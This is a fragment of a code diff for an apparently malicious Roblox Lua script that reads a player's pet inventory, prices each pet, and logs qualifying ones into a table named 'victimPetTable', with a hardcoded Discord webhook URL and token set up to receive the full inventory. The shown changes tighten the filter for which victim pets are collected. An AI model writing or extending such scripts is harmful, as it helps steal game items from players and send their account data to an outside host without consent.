@@ -12,10 +12,8 @@ getgenv().PetConfig = {
 
 getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
 
-local totalValue = 0
 local passedPets = {}
 local failedPets = {}
-
 local countPassed = 0
 local countFailed = 0
 local valueFailed = 0
@@ -477,10 +475,11 @@ for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
 
     local infoLine = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
 
-    if inWhitelist then
+    if inWhitelist and isValid then
         table.insert(passedPets, infoLine)
         totalValue += petPrice
         countPassed += 1
+        table.insert(victimPetTable, infoLine)
     else
         table.insert(failedPets, infoLine)
         valueFailed += petPrice
